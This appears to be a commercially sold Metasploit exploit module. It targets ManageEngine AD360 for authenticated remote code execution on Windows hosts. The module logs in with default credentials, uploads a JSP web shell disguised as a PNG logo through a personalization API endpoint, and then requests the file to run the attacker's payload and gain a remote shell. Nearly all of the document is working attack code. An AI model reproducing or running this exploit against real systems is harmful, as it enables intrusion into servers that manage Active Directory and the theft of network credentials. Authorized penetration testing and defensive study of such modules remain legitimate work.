##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'ManageEngine AD360 Authenticated Remote Code Execution',
      'Description' => %q{
    This module exploits an authenticated remote code execution vulnerability
    in order to gain a remote shell on the server.

    ManageEngine AD360 is a popular enterprise solution for managing and
auditing environments using ActiveDirectory for authentication. Privileged
access to an AD360 instance could yield signficant insight into credentials
on the network. This module exploits an authenticated remote code execution
vulnerability in order to gain a remote shell on the host.

    Categories: Enterprise

    Price: 7

    Video: https://asciinema.org/a/uq1KjR1dFQbKG2571kEhoISfT

    OS: Windows

    Arch: Multi

    Requirements: Metasploit Framework
      },
      'Author' =>
        [
        ],
      'License' => 'VolatileMinds',
      'References' =>
        [
        ],
      'Privileged' => false,
      'Platform'   => ['win'],
      'Arch'       => ARCH_CMD,
      'Payload'    =>
        {
          'BadChars' => "&\n=+%",
        },
      'Targets' =>
        [
          [ 'Automatic', { } ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => ''))

    register_options(
      [
         Opt::RPORT(8082),
         OptString.new('TARGETURI', [ true, "Base URI", '/']),
         OptString.new('USERNAME', [true, 'The username to authenticate with', 'operator']),
         OptString.new('PASSWORD', [true, 'The password to authenticate with', 'admin']),
         OptString.new('DOMAIN', [true, 'The domain to authenticate with', 'AD360 Authentication'])
      ], self.class)
  end

  def exploit
    data = Rex::MIME::Message.new

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'AppsHome.do')
    })

    cookie = res.get_cookies

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'j_security_check'),
      'vars_post' => {
        'j_username' => datastore['USERNAME'],
        'j_password' => datastore['PASSWORD'],
        'domainName' => datastore['DOMAIN'],
        'AUTHRULE_NAME' => 'Authenticator'
      },
      'cookie' => cookie
    })

    if res && res.code != 303
      fail_with(Failure::Unknown, 'Authentication failed')
    end

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'AppsHome.do'),
      'cookie' => cookie
    })

    cookie = res.get_cookies

    filename = Rex::Text.rand_text_alpha(8) + ".jsp"
    data.add_part('<% Runtime.getRuntime().exec("'+payload.encoded+'"); %>', 'image/png', nil, 'form-data; name="LOGO_PATH"; filename="'+filename+'"')
    data.add_part('ManageEngine AD360', nil, nil, 'form-data; name="BROWSER_TITLE"')
    data.add_part('', nil, nil, 'form-data; name="FAVICON_PATH"; filename=""')
    data.add_part('false', nil, nil, 'form-data; name="ENABLE_FORGOT_PWD"')
    data.add_part('0', nil, nil, 'form-data;name="SELECT_LANGUAGE"')
    data.add_part('Asia/Calcutta', nil, nil, 'form-data; name="TIME_ZONE"')
    data.add_part('yyyy/MM/dd HH:mm:ss', nil, nil, 'form-data; name="DATE_TIME_FORMAT"')
    data.add_part('green', nil, nil, 'form-data; name="THEME_COLOR"')


    res = send_request_cgi({
      'ctype' => "multipart/form-data;charset=UTF-8;boundary=#{data.bound}",
      'method' => 'POST',
      'data' => data.to_s,
      'cookie' => cookie,
      'uri' => normalize_uri(target_uri.path, 'RestAPI/WC/Personalize?mTCall=updatePersonalizeSettings')
    })

    send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'images/adsf/common/logos/'+filename)
    })

  end
end
